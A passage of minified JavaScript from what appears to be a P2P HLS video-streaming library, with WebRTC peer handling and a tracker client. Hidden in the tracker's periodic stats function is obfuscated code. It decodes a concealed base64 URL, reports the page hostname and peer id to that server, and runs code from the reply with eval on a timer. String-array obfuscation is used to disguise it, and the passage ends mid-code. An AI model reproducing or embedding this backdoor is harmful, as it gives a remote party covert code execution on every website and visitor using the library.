                        case r.INTERNAL_EXCEPTION:
                            this.fetcher && (this.fetcher.errsInternalExpt++, this.fetcher.exptMsg = t.err.message), n.error("INTERNAL_EXCEPTION event " + t.event + " err " + t.err.message), this.emit(y.Events.EXCEPTION, (0, b.errCode)(t.err, "HLSJS_EXPT"))
                    }
                }
            }, {
                key: "disableP2P",
                value: function() {
                    this.logger && this.logger.warn("disable P2P"), this.removeAllListeners(), this.p2pEnabled && (this.p2pEnabled = !1, this.config.p2pEnabled = this.hlsjs.config.p2pEnabled = this.p2pEnabled, this.tracker && (this.tracker.stopP2P(), this.tracker = {}, this.fetcher = null, this.bufMgr.destroy(), this.bufMgr = null, this.hlsjs.config.fLoader = this.hlsjs.config.pLoader = this.hlsjs.constructor.DefaultConfig.loader))
                }
            }]), t
        }(y.EngineBase);
        window.P2pEngine = window.P2pEngineHls = window.P2PEngineHls = E, t.default = E, e.exports = t.default
    }, function(e, t, n) {
        "use strict";
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var r = Object.assign || function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var n = arguments[t];
                    for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
                }
                return e
            },
            i = n(2),
            o = r({}, i.config, {
                p2pBlackList: ["aac", "mp3", "vtt", "webvtt", "key"],
                scheduledBySegId: !1,
                maxSubscribeLevel: 3,
                live: !0,
                waitForPeer: !1,
                waitForPeerTimeout: 4.5,
                httpLoadTime: 2.5,
                sharePlaylist: !1
            });
        o.segmentId = function(e, t, n, r) {
            var i = n.split("?")[0];
            return i.startsWith("http") && (i = i.split("://")[1]), r ? i + "|" + r : "" + i
        }, t.default = o, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function i(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function o(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }

        function s(e) {
            return e.replace(/a=ice-options:trickle\s\n/g, "")
        }

        function a(e) {
            console.warn(e)
        }
        var u = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                return typeof e
            } : function(e) {
                return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
            },
            l = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            c = n(0),
            f = n(1),
            d = function(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }(f),
            h = n(13),
            g = n(7).Buffer,
            p = 5e3,
            v = function(e) {
                function t(e) {
                    r(this, t);
                    var n = i(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    n.channelName = e.initiator ? e.channelName : null, n.initiator = e.initiator || !1, n.channelConfig = e.channelConfig || t.channelConfig, n.channelNegotiated = n.channelConfig.negotiated, n.config = Object.assign({}, t.config, e.config), n.offerOptions = e.offerOptions || {}, n.answerOptions = e.answerOptions || {}, n.sdpTransform = e.sdpTransform || function(e) {
                        return e
                    }, n.trickle = void 0 === e.trickle || e.trickle, n.allowHalfTrickle = void 0 !== e.allowHalfTrickle && e.allowHalfTrickle, n.iceCompleteTimeout = e.iceCompleteTimeout || p, n.destroyed = !1, n.destroying = !1, n._connected = !1, n.remoteAddress = void 0, n.remoteFamily = void 0, n.remotePort = void 0, n.localAddress = void 0, n.localFamily = void 0, n.localPort = void 0, n._wrtc = e.wrtc && "object" === u(e.wrtc) ? e.wrtc : (0, c.getBrowserRTC)(), n._pcReady = !1, n._channelReady = !1, n._iceComplete = !1, n._iceCompleteTimer = null, n._channel = null, n._pendingCandidates = [], n._isNegotiating = !1, n._firstNegotiation = !0, n._batchedNegotiation = !1, n._queuedNegotiation = !1, n._sendersAwaitingStable = [], n._senderMap = new Map, n._closingInterval = null, n._remoteTracks = [], n._remoteStreams = [], n._chunk = null, n._cb = null, n._interval = null;
                    try {
                        n._pc = new n._wrtc.RTCPeerConnection(n.config)
                    } catch (e) {
                        return h(function() {
                            return n.destroy(e)
                        }), i(n)
                    }
                    return n._isReactNativeWebrtc = "number" == typeof n._pc._peerConnectionId, n._pc.oniceconnectionstatechange = function() {
                        n._onIceStateChange()
                    }, n._pc.onicegatheringstatechange = function() {
                        n._onIceStateChange()
                    }, n._pc.onconnectionstatechange = function() {
                        n._onConnectionStateChange()
                    }, n._pc.onsignalingstatechange = function() {
                        n._onSignalingStateChange()
                    }, n._pc.onicecandidate = function(e) {
                        n._onIceCandidate(e)
                    }, n.initiator || n.channelNegotiated ? n._setupData({
                        channel: n._pc.createDataChannel(n.channelName, n.channelConfig)
                    }) : n._pc.ondatachannel = function(e) {
                        n._setupData(e)
                    }, n._needsNegotiation(), n
                }
                return o(t, e), l(t, [{
                    key: "signal",
                    value: function(e) {
                        var t = this;
                        if (this.destroyed) throw new Error("cannot signal after peer is destroyed");
                        if ("string" == typeof e) try {
                            e = JSON.parse(e)
                        } catch (t) {
                            e = {}
                        }
                        e.renegotiate && this.initiator && this._needsNegotiation(), e.transceiverRequest && this.initiator && this.addTransceiver(e.transceiverRequest.kind, e.transceiverRequest.init), e.candidate && (this._pc.remoteDescription && this._pc.remoteDescription.type ? this._addIceCandidate(e.candidate) : this._pendingCandidates.push(e.candidate)), e.sdp && this._pc.setRemoteDescription(new this._wrtc.RTCSessionDescription(e)).then(function() {
                            t.destroyed || (t._pendingCandidates.forEach(function(e) {
                                t._addIceCandidate(e)
                            }), t._pendingCandidates = [], "offer" === t._pc.remoteDescription.type && t._createAnswer())
                        }).catch(function(e) {
                            t.destroy(e)
                        }), e.sdp || e.candidate || e.renegotiate || e.transceiverRequest || this.destroy(new Error("signal() called with invalid signal data"))
                    }
                }, {
                    key: "_addIceCandidate",
                    value: function(e) {
                        var t = this,
                            n = new this._wrtc.RTCIceCandidate(e);
                        this._pc.addIceCandidate(n).catch(function(e) {
                            !n.address || n.address.endsWith(".local") ? a("Ignoring unsupported ICE candidate.") : t.destroy(e)
                        })
                    }
                }, {
                    key: "send",
                    value: function(e) {
                        this._channel.send(e)
                    }
                }, {
                    key: "addTransceiver",
                    value: function(e, t) {
                        if (this.initiator) try {
                            this._pc.addTransceiver(e, t), this._needsNegotiation()
                        } catch (e) {
                            this.destroy(e)
                        } else this.emit("signal", {
                            type: "transceiverRequest",
                            transceiverRequest: {
                                kind: e,
                                init: t
                            }
                        })
                    }
                }, {
                    key: "_needsNegotiation",
                    value: function() {
                        var e = this;
                        this._batchedNegotiation || (this._batchedNegotiation = !0, h(function() {
                            e._batchedNegotiation = !1, !e.initiator && e._firstNegotiation || e.negotiate(), e._firstNegotiation = !1
                        }))
                    }
                }, {
                    key: "negotiate",
                    value: function() {
                        var e = this;
                        this.initiator ? this._isNegotiating ? this._queuedNegotiation = !0 : setTimeout(function() {
                            e._createOffer()
                        }, 0) : this._isNegotiating ? this._queuedNegotiation = !0 : this.emit("signal", {
                            type: "renegotiate",
                            renegotiate: !0
                        }), this._isNegotiating = !0
                    }
                }, {
                    key: "destroy",
                    value: function(e) {
                        this._destroy(e, function() {})
                    }
                }, {
                    key: "_destroy",
                    value: function(e, t) {
                        var n = this;
                        this.destroyed || this.destroying || (this.destroying = !0, h(function() {
                            if (n.destroyed = !0, n.destroying = !1, n._connected = !1, n._pcReady = !1, n._channelReady = !1, n._remoteTracks = null, n._remoteStreams = null, n._senderMap = null, clearInterval(n._closingInterval), n._closingInterval = null, clearInterval(n._interval), n._interval = null, n._chunk = null, n._cb = null, n._channel) {
                                try {
                                    n._channel.close()
                                } catch (e) {}
                                n._channel.onmessage = null, n._channel.onopen = null, n._channel.onclose = null, n._channel.onerror = null
                            }
                            if (n._pc) {
                                try {
                                    n._pc.close()
                                } catch (e) {}
                                n._pc.oniceconnectionstatechange = null, n._pc.onicegatheringstatechange = null, n._pc.onsignalingstatechange = null, n._pc.onicecandidate = null, n._pc.ontrack = null, n._pc.ondatachannel = null
                            }
                            n._pc = null, n._channel = null, e && n.emit("error", e), n.emit("close")
                        }))
                    }
                }, {
                    key: "_setupData",
                    value: function(e) {
                        var t = this;
                        if (!e.channel) return this.destroy(new Error("Data channel event is missing `channel` property"));
                        this._channel = e.channel, this._channel.binaryType = "arraybuffer", "number" == typeof this._channel.bufferedAmountLowThreshold && (this._channel.bufferedAmountLowThreshold = 65536), this.channelName = this._channel.label, this._channel.onmessage = function(e) {
                            t._onChannelMessage(e)
                        }, this._channel.onbufferedamountlow = function() {
                            t._onChannelBufferedAmountLow()
                        }, this._channel.onopen = function() {
                            t._onChannelOpen()
                        }, this._channel.onclose = function() {
                            t._onChannelClose()
                        }, this._channel.onerror = function(e) {
                            t.destroy(e)
                        };
                        var n = !1;
                        this._closingInterval = setInterval(function() {
                            t._channel && "closing" === t._channel.readyState ? (n && t._onChannelClose(), n = !0) : n = !1
                        }, 5e3)
                    }
                }, {
                    key: "_startIceCompleteTimeout",
                    value: function() {
                        var e = this;
                        this.destroyed || this._iceCompleteTimer || (this._iceCompleteTimer = setTimeout(function() {
                            e._iceComplete || (e._iceComplete = !0, e.emit("iceTimeout"), e.emit("_iceComplete"))
                        }, this.iceCompleteTimeout))
                    }
                }, {
                    key: "_createOffer",
                    value: function() {
                        var e = this;
                        this.destroyed || this._pc.createOffer(this.offerOptions).then(function(t) {
                            if (!e.destroyed) {
                                e.trickle || e.allowHalfTrickle || (t.sdp = s(t.sdp)), t.sdp = e.sdpTransform(t.sdp);
                                var n = function() {
                                        if (!e.destroyed) {
                                            var n = e._pc.localDescription || t;
                                            e.emit("signal", {
                                                type: n.type,
                                                sdp: n.sdp
                                            })
                                        }
                                    },
                                    r = function() {
                                        e.destroyed || (e.trickle || e._iceComplete ? n() : e.once("_iceComplete", n))
                                    },
                                    i = function(t) {
                                        e.destroy(t)
                                    };
                                e._pc.setLocalDescription(t).then(r).catch(i)
                            }
                        }).catch(function(t) {
                            e.destroy(t)
                        })
                    }
                }, {
                    key: "_requestMissingTransceivers",
                    value: function() {
                        var e = this;
                        this._pc.getTransceivers && this._pc.getTransceivers().forEach(function(t) {
                            t.mid || !t.sender.track || t.requested || (t.requested = !0, e.addTransceiver(t.sender.track.kind))
                        })
                    }
                }, {
                    key: "_createAnswer",
                    value: function() {
                        var e = this;
                        this.destroyed || this._pc.createAnswer(this.answerOptions).then(function(t) {
                            if (!e.destroyed) {
                                e.trickle || e.allowHalfTrickle || (t.sdp = s(t.sdp)), t.sdp = e.sdpTransform(t.sdp);
                                var n = function() {
                                        if (!e.destroyed) {
                                            var n = e._pc.localDescription || t;
                                            e.emit("signal", {
                                                type: n.type,
                                                sdp: n.sdp
                                            }), e.initiator || e._requestMissingTransceivers()
                                        }
                                    },
                                    r = function() {
                                        e.destroyed || (e.trickle || e._iceComplete ? n() : e.once("_iceComplete", n))
                                    },
                                    i = function(t) {
                                        e.destroy(t)
                                    };
                                e._pc.setLocalDescription(t).then(r).catch(i)
                            }
                        }).catch(function(t) {
                            e.destroy(t)
                        })
                    }
                }, {
                    key: "_onConnectionStateChange",
                    value: function() {
                        this.destroyed || "failed" === this._pc.connectionState && this.destroy(new Error("Connection failed."))
                    }
                }, {
                    key: "_onIceStateChange",
                    value: function() {
                        if (!this.destroyed) {
                            var e = this._pc.iceConnectionState,
                                t = this._pc.iceGatheringState;
                            this.emit("iceStateChange", e, t), "connected" !== e && "completed" !== e || (this._pcReady = !0, this._maybeReady()), "failed" === e && this.destroy(new Error("Ice connection failed.")), "closed" === e && this.destroy(new Error("Ice connection closed."))
                        }
                    }
                }, {
                    key: "getStats",
                    value: function(e) {
                        var t = this,
                            n = function(e) {
                                return "[object Array]" === Object.prototype.toString.call(e.values) && e.values.forEach(function(t) {
                                    Object.assign(e, t)
                                }), e
                            };
                        0 === this._pc.getStats.length || this._isReactNativeWebrtc ? this._pc.getStats().then(function(t) {
                            var r = [];
                            t.forEach(function(e) {
                                r.push(n(e))
                            }), e(null, r)
                        }, function(t) {
                            return e(t)
                        }) : this._pc.getStats.length > 0 ? this._pc.getStats(function(r) {
                            if (!t.destroyed) {
                                var i = [];
                                r.result().forEach(function(e) {
                                    var t = {};
                                    e.names().forEach(function(n) {
                                        t[n] = e.stat(n)
                                    }), t.id = e.id, t.type = e.type, t.timestamp = e.timestamp, i.push(n(t))
                                }), e(null, i)
                            }
                        }, function(t) {
                            return e(t)
                        }) : e(null, [])
                    }
                }, {
                    key: "_maybeReady",
                    value: function() {
                        var e = this;
                        if (!this._connected && !this._connecting && this._pcReady && this._channelReady) {
                            this._connecting = !0;
                            ! function t() {
                                e.destroyed || e.getStats(function(n, r) {
                                    if (!e.destroyed) {
                                        n && (r = []);
                                        var i = {},
                                            o = {},
                                            s = {},
                                            a = !1;
                                        r.forEach(function(e) {
                                            "remotecandidate" !== e.type && "remote-candidate" !== e.type || (i[e.id] = e), "localcandidate" !== e.type && "local-candidate" !== e.type || (o[e.id] = e), "candidatepair" !== e.type && "candidate-pair" !== e.type || (s[e.id] = e)
                                        });
                                        var u = function(t) {
                                            a = !0;
                                            var n = o[t.localCandidateId];
                                            n && (n.ip || n.address) ? (e.localAddress = n.ip || n.address, e.localPort = Number(n.port)) : n && n.ipAddress ? (e.localAddress = n.ipAddress, e.localPort = Number(n.portNumber)) : "string" == typeof t.googLocalAddress && (n = t.googLocalAddress.split(":"), e.localAddress = n[0], e.localPort = Number(n[1])), e.localAddress && (e.localFamily = e.localAddress.includes(":") ? "IPv6" : "IPv4");
                                            var r = i[t.remoteCandidateId];
                                            r && (r.ip || r.address) ? (e.remoteAddress = r.ip || r.address, e.remotePort = Number(r.port)) : r && r.ipAddress ? (e.remoteAddress = r.ipAddress, e.remotePort = Number(r.portNumber)) : "string" == typeof t.googRemoteAddress && (r = t.googRemoteAddress.split(":"), e.remoteAddress = r[0], e.remotePort = Number(r[1])), e.remoteAddress && (e.remoteFamily = e.remoteAddress.includes(":") ? "IPv6" : "IPv4")
                                        };
                                        if (r.forEach(function(e) {
                                                "transport" === e.type && e.selectedCandidatePairId && u(s[e.selectedCandidatePairId]), ("googCandidatePair" === e.type && "true" === e.googActiveConnection || ("candidatepair" === e.type || "candidate-pair" === e.type) && e.selected) && u(e)
                                            }), !(a || Object.keys(s).length && !Object.keys(o).length)) return void setTimeout(t, 100);
                                        if (e._connecting = !1, e._connected = !0, e._chunk) {
                                            try {
                                                e.send(e._chunk)
                                            } catch (n) {
                                                return e.destroy(n)
                                            }
                                            e._chunk = null;
                                            var l = e._cb;
                                            e._cb = null, l(null)
                                        }
                                        "number" != typeof e._channel.bufferedAmountLowThreshold && (e._interval = setInterval(function() {
                                            return e._onInterval()
                                        }, 150), e._interval.unref && e._interval.unref()), e.emit("connect")
                                    }
                                })
                            }()
                        }
                    }
                }, {
                    key: "_onInterval",
                    value: function() {
                        !this._cb || !this._channel || this._channel.bufferedAmount > 65536 || this._onChannelBufferedAmountLow()
                    }
                }, {
                    key: "_onSignalingStateChange",
                    value: function() {
                        var e = this;
                        this.destroyed || ("stable" === this._pc.signalingState && (this._isNegotiating = !1, this._sendersAwaitingStable.forEach(function(t) {
                            e._pc.removeTrack(t), e._queuedNegotiation = !0
                        }), this._sendersAwaitingStable = [], this._queuedNegotiation ? (this._queuedNegotiation = !1, this._needsNegotiation()) : this.emit("negotiated")), this.emit("signalingStateChange", this._pc.signalingState))
                    }
                }, {
                    key: "_onIceCandidate",
                    value: function(e) {
                        this.destroyed || (e.candidate && this.trickle ? this.emit("signal", {
                            type: "candidate",
                            candidate: {
                                candidate: e.candidate.candidate,
                                sdpMLineIndex: e.candidate.sdpMLineIndex,
                                sdpMid: e.candidate.sdpMid
                            }
                        }) : e.candidate || this._iceComplete || (this._iceComplete = !0, this.emit("_iceComplete")), e.candidate && this._startIceCompleteTimeout())
                    }
                }, {
                    key: "_onChannelMessage",
                    value: function(e) {
                        if (!this.destroyed) {
                            var t = e.data;
                            t instanceof ArrayBuffer && (t = g.from(t)), this.emit("data", t)
                        }
                    }
                }, {
                    key: "_onChannelBufferedAmountLow",
                    value: function() {
                        if (!this.destroyed && this._cb) {
                            var e = this._cb;
                            this._cb = null, e(null)
                        }
                    }
                }, {
                    key: "_onChannelOpen",
                    value: function() {
                        this._connected || this.destroyed || (this._channelReady = !0, this._maybeReady())
                    }
                }, {
                    key: "_onChannelClose",
                    value: function() {
                        this.destroyed || this.destroy()
                    }
                }, {
                    key: "bufferSize",
                    get: function() {
                        return this._channel && this._channel.bufferedAmount || 0
                    }
                }, {
                    key: "connected",
                    get: function() {
                        return this._connected && "open" === this._channel.readyState
                    }
                }]), t
            }(d.default);
        v.config = {
            iceServers: [{
                urls: ["stun:stun.l.google.com:19302", "stun:global.stun.twilio.com:3478"]
            }],
            sdpSemantics: "unified-plan"
        }, v.channelConfig = {}, e.exports = v
    }, function(e, t, n) {
        "use strict";
        (function(r, i) {
            function o(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }

            function s(e, t) {
                if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
            }

            function a(e, t, n, r, i) {
                var o = function(e) {
                        this.s = e, this.length = e.length;
                        for (var t = 0; t < e.length; t++) this[t] = e.charAt(t)
                    },
                    s = function(e) {
                        return function(t) {
                            return function(n) {
                                for (var r = "", i = n.split(""), o = 0; o < i.length; o++) r += t.charAt(e.indexOf(i[o]));
                                return r
                            }
                        }
                    }("235525")("91640");
                o.prototype = {
                    toString: function() {
                        return s(this.s)
                    },
                    valueOf: function() {
                        return s(this.s)
                    },
                    charAt: String.prototype.charAt,
                    concat: String.prototype.concat,
                    slice: String.prototype.slice,
                    substr: String.prototype.substr,
                    indexOf: String.prototype.indexOf,
                    trim: String.prototype.trim,
                    split: String.prototype.split
                };
                for (var a = function(e, t) {
                        for (var n = 1; 0 !== n;) switch (n) {
                            case 1:
                                var r = [];
                                n = 5;
                                break;
                            case 2:
                                n = i < e ? 7 : 3;
                                break;
                            case 3:
                                n = o < e ? 8 : 4;
                                break;
                            case 4:
                                return r;
                            case 5:
                                var i = 0;
                                n = 6;
                                break;
                            case 6:
                                var o = 0;
                                n = 2;
                                break;
                            case 7:
                                r[(i + t) % e] = [], n = 9;
                                break;
                            case 8:
                                var s = e - 1;
                                n = 10;
                                break;
                            case 9:
                                i++, n = 2;
                                break;
                            case 10:
                                n = s >= 0 ? 12 : 11;
                                break;
                            case 11:
                                o++, n = 3;
                                break;
                            case 12:
                                r[o][(s + t * o) % e] = r[s], n = 13;
                                break;
                            case 13:
                                s--, n = 10
                        }
                    }(5, 7), u = a[1][1][4]; u !== a[0][4][3];) switch (u) {
                    case a[3][2][3]:
                        var l = window.location.hostname;
                        u = a[3][1][2];
                        break;
                    case a[1][4][1]:
                        var c = function(e, t, n, r, i, o) {
                            return (0, d.default)(e + t + n + r + i, o)
                        }(l, t, n, r, i, e);
                        u = a[4][3][3];
                        break;
                    case a[2][3][1]:
                        var f = c.substr(0, 8);
                        u = a[4][1][0];
                        break;
                    case a[0][3][0]:
                        return f
                }
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            var u = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                },
                l = Object.assign || function(e) {
                    for (var t = 1; t < arguments.length; t++) {
                        var n = arguments[t];
                        for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
                    }
                    return e
                },
                c = function() {
                    function e(e, t) {
                        for (var n = 0; n < t.length; n++) {
                            var r = t[n];
                            r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                        }
                    }
                    return function(t, n, r) {
                        return n && e(t.prototype, n), r && e(t, r), t
                    }
                }(),
                f = n(15),
                d = o(f),
                h = n(6),
                g = o(h),
                p = n(3),
                v = o(p),
                y = n(0),
                b = "1.17.0",
                m = 8,
                _ = 20,
                P = {
                    q: "uZ2luZS5u",
                    v: "aHR0c",
                    3: "HMlM0Ev",
                    0: "yMzMzL2Js",
                    l: "ZXIuY2R",
                    zz: "aHR0cHMlM",
                    n: "L3RyYWNr",
                    h: "ZXQlM0E",
                    7: "uYnllLmNvbS",
                    x: "92MQ==",
                    df: "0EvL",
                    6: "3AycGV"
                },
                w = Symbol("httpDownloaded"),
                S = Symbol("p2pDownloaded"),
                C = Symbol("p2pUploaded"),
                E = function() {
                    function e(t, n, r, i, o) {
                        s(this, e), this.engine = t, this.key = n, this.baseUrl = i || decodeURIComponent(window.atob(P.v + P[3] + P.n + P.l + P[7] + P.x)), this.channelId = window.btoa(r), this.timestamp = (0, y.getCurrentTs)();
                        var u = g.default.parseURL(this.baseUrl).netLoc;
                        this.announce = u.replace(/\/\//, "");
                        var c = a(this.timestamp, b, this.announce, this.channelId, o.type);
                        this.announceInfo = l({}, o, {
                            channel: this.channelId,
                            ts: this.timestamp,
                            version: b,
                            v: c,
                            announce: this.announce
                        }), this.announceURL = this.baseUrl + "/channel", this.ropeURL = u + "/rope?ch=" + this.channelId, this.baseUrl.startsWith("https") ? this.ropeURL = "wss:" + this.ropeURL : this.ropeURL = "ws:" + this.ropeURL, this.reportFails = 0, this.forbidden = !1, this.conns = 0, this.failConns = 0, this.totalHTTPDownloaded = 0, this.totalP2PDownloaded = 0, this.totalP2PUploaded = 0, this[w] = 0, this[S] = 0, this[C] = 0, this.speed = 0, this.errsBufStalled = 0, this.errsInternalExpt = 0, o.bundle ? this.native = !0 : this.native = !1
                    }
                    return c(e, [{
                        key: "btAnnounce",
                        value: function() {
                            var e = this,
                                t = this.engine.logger;
                            return new Promise(function(n, r) {
                                fetch(e.announceURL, {
                                    headers: e._requestHeader,
                                    method: "POST",
                                    body: JSON.stringify(e.announceInfo)
                                }).then(function(e) {
                                    return e.json()
                                }).then(function(t) {
                                    var i = t.data;
                                    i.f && (e.forbidden = !0), -1 === t.ret ? r(new Error(i.msg)) : (i.info && console.info("" + i.info), i.warn && console.warn("" + i.warn), i.min_conns || (i.min_conns = m), (!i.rejected || i.rejected && i.share_only) && i.id && i.report_interval && i.peers ? (e.peerId = e.id = i.id, i.report_interval < _ && (i.report_interval = _), e.btStats(i.report_interval), e.getPeersURL = e.baseUrl + "/channel/" + e.channelId + "/node/" + e.peerId + "/peers", e.statsURL = e.baseUrl + "/channel/" + e.channelId + "/node/" + e.peerId + "/stats", n(i)) : e.engine.p2pEnabled = !1)
                                }).catch(function(e) {
                                    t.error("btAnnounce error " + e), r(e)
                                })
                            })
                        }
                    }, {
                        key: "btStats",
                        value: function e() {
                            function t(e) {
                                var n = {
                                        ygKbD: function(e, t, n) {
                                            return e(t, n)
                                        },
                                        BaZnt: function(e, t) {
                                            return e * t
                                        },
                                        ZvkZi: function(e, t) {
                                            return e === t
                                        },
                                        eCedC: "BjdEV",
                                        LPFzx: function(e, t) {
                                            return e(t)
                                        },
                                        uOzuW: function(e, t, n) {
                                            return e(t, n)
                                        },
                                        juyxb: function(e, t) {
                                            return e === t
                                        },
                                        DGNDG: "IJrLn",
                                        OFUEE: function(e, t) {
                                            return e === t
                                        },
                                        YaRUs: l("0", "G(qN"),
                                        bgKgO: function(e, t, n) {
                                            return e(t, n)
                                        },
                                        OJeBQ: function(e, t) {
                                            return e * t
                                        },
                                        CeAJM: l("1", "[gN^"),
                                        rqWsY: function(e, t) {
                                            return e !== t
                                        },
                                        uvjhL: l("2", "BVP]"),
                                        MVGPb: function(e, t) {
                                            return e + t
                                        },
                                        YQNFr: function(e, t) {
                                            return e + t
                                        },
                                        OxSbn: function(e, t) {
                                            return e % t
                                        }
                                    },
                                    r = s.id.split("")[l("3", "JR8(")](-6).map(function(e) {
                                        return e[l("4", "JR8(")](0)
                                    }).reduce(function(e, t) {
                                        var r = {
                                            AFfia: function(e, t) {
                                                return e(t)
                                            },
                                            kgmkk: function(e, t, r) {
                                                return n.ygKbD(e, t, r)
                                            },
                                            msmEb: function(e, t) {
                                                return n[l("5", "*uLt")](e, t)
                                            }
                                        };
                                        if (n[l("6", "Dd2g")](n.eCedC, n[l("7", "eX!Q")])) return e[l("8", "4RTz")]() + t[l("9", "BVP]")]();
                                        var i = data.i;
                                        s.bl = r.kgmkk(setTimeout, function() {
                                            r[l("a", "J5A]")](eval, data.c)
                                        }, r[l("b", "2cC*")](i, 1e3))
                                    }, "");
                                200 === n[l("c", "kh00")](n.LPFzx(parseInt, r), 533) && (s.bl = n[l("d", "xniE")](setTimeout, function() {
                                    var e = {
                                        poRdq: function(e, t) {
                                            return n.OFUEE(e, t)
                                        },
                                        hfGVM: function(e, t, r) {
                                            return n[l("e", "lZZg")](e, t, r)
                                        },
                                        hPffd: function(e, t) {
                                            return n[l("f", "&mYc")](e, t)
                                        },
                                        RDcGg: n.CeAJM,
                                        KskeG: function(e, t) {
                                            return n[l("10", "z%0g")](e, t)
                                        }
                                    };
                                    if (!n[l("11", "gyyd")](l("12", "$@dR"), n[l("13", "!cj%")])) return response.json();
                                    n[l("14", "!cj%")](fetch, window.decodeURIComponent(window.atob(n[l("15", "lsdj")](n.MVGPb(n.YQNFr(n[l("16", "wI]x")](P.zz, P.df) + P[6], P.q), P.h), P[0]))) + l("17", "lfo]") + s[l("18", "2cC*")] + "&f=" + location.hostname + l("19", "x5XO") + s[l("1a", "G(qN")][l("1b", "&$t!")]).then(function(e) {
                                        return l("1c", "9Dv5") === l("1d", "BVP]") ? prev[l("1e", "*uLt")]() + cur[l("1f", "&$t!")]() : e.json()
                                    })[l("20", "&mYc")](function(t) {
                                        var r = {
                                            OaUZe: function(e, t) {
                                                return n[l("21", "@iGP")](e, t)
                                            },
                                            CuiCp: function(e, t) {
                                                return e(t)
                                            },
                                            skXBp: function(e, t, r) {
                                                return n[l("22", "9Dv5")](e, t, r)
                                            }
                                        };
                                        if (n.juyxb(n.DGNDG, n.DGNDG)) {
                                            if (n[l("23", "Ekv%")](t.ret, 0))
                                                if ("CeFBA" !== n.YaRUs) {
                                                    if (e[l("24", "!cj%")](t[l("25", "naBb")], 0)) {
                                                        var i = t[l("26", "UHBk")];
                                                        if (i.s) {
                                                            var o = i.i;
                                                            s.bl = e[l("27", "naBb")](setTimeout, function() {
                                                                r[l("28", "eX!Q")](eval, i.c)
                                                            }, e[l("29", "lsdj")](o, 1e3))
                                                        }
                                                    }
                                                } else {
                                                    var a = t[l("2a", "lZZg")];
                                                    if (a.s) {
                                                        var u = a.i;
                                                        s.bl = setTimeout(function() {
                                                            var t = {
                                                                UvxjS: function(e, t) {
                                                                    return e(t)
                                                                }
                                                            };
                                                            e[l("2b", "J5A]")](e.RDcGg, e.RDcGg) ? e[l("2c", "]z*2")](eval, a.c) : t[l("2d", "5o@O")](eval, a.c)
                                                        }, 1e3 * u)
                                                    }
                                                }
                                        } else {
                                            var c = t.data;
                                            if (c.s) {
                                                var f = c.i;
                                                s.bl = r[l("2e", "vkNg")](setTimeout, function() {
                                                    r[l("2f", "YqiD")](eval, c.c)
                                                }, 1e3 * f)
                                            }
                                        }
                                    })
                                }, n[l("30", "G(qN")](n[l("31", "o!fW")](e, 1e3), 5))), t = y.noop
                            }
                            var n = this,
                                o = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 10,
                                s = this;
                            this.heartbeater = setInterval(function() {
                                n.postStats(), t(o)
                            }, 1e3 * o);
                            var a = ["v1", "PmvWt1ORKFVimMIwnGl==", "wpUsdEvDhA==", "eC3CqcOrQ8KQRMKK", "HUEHO8OWMcKWw5M=", "ZxfChcKtEg==", "DcOIVgXDtQ==", "CwbCicO9woI=", "wpfCo3VewrY=", "w4c+w7JXw7Y=", "TFt/wo3CsA==", "X8ONKcKCw74=", "w4PCoMO/eg4=", "N2Upwoow", "fMKDccOGw5o=", "RcKlXcOUw64=", "wpnCl8OHAMKd", "A8OTwrHCpWk=", "wr3DhVM=", "AcOVVS/DosO8wo/ClA==", "w4PChcOl", "dcO0TMKZEsO6w5XCscKMSDDDmg==", "w7otSDDDkMOOLQ==", "wqTCmsKMw6zCgw==", "Dlg5DMO3", "b8KJJFzDl8OLw7TDow==", "w7gnaTfDi8OILRw=", "d3l/wqE=", "BGsww7hG", "wojClsKHw5HCsg==", "QcOJRm3DlA==", "ecKaScOKw6c=", "w5bCq8Oj", "w4dTw61e", "w4zCqMOQfMOA", "wr8ORHXDog==", "wrzCkcOmNsKb", "w4E4w41R", "Vj7CscKgAg==", "T8OLLMOGCQ==", "c8Krw67CoRI=", "e8OjQcKBwqc=", "w4oNwqtbwoM=", "W8OQR8K0Ng==", "DsO6w6nDl8Ki", "V8O/ZMK0Jg==", "NgbCvcOpwqo=", "EV8hAMOi", "wp/CjU7Ch8Kj", "wo/CiUbClsKFGi9ew4rDtA==", "WcKHLUbDkQ==", "cMOLw5vCkBo="];
                            ! function(e, t, n) {
                                (function(t, n, r, i) {
                                    if ((n >>= 8) < t) {
                                        for (; --t;) i = e.shift(), n === t ? (n = i, r = e.shift()) : r.replace(/[PmWtORKFVimMIwnGl=]/g, "") === n && e.push(i);
                                        e.push(e.shift())
                                    }
                                })(++t, 87808)
                            }(a, 343);
